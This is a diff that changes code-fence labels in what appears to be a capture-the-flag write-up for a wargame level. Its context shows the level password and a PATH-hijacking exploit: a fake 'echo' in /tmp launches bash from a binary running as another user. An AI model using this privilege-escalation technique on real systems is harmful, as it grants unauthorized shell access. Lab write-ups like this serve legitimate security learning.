@@ -6,7 +6,7 @@ level03's password: `kooda2puivaav1idi4f57q8iq`
 
 1. examinate existing files and permissions
 
-```shell
+```bash
 ls -la
 ```
 
@@ -23,7 +23,7 @@ shows geteuid() and getegid(), meaning that the binary is running as flag03
 
 4. Exploit env vars usage by changing `$PATH` and making the binary run your prefered program (I chose bash)
 
-```shell
+```bash
 PATH=/tmp:$PATH
 echo /bin/bash > /tmp/echo
 chmod +x /tmp/echo
@@ -31,7 +31,7 @@ chmod +x /tmp/echo
 
 5. Execute the original binary and pwn flag
 
-```shell
+```bash
 ./level03
 getflag
 ```
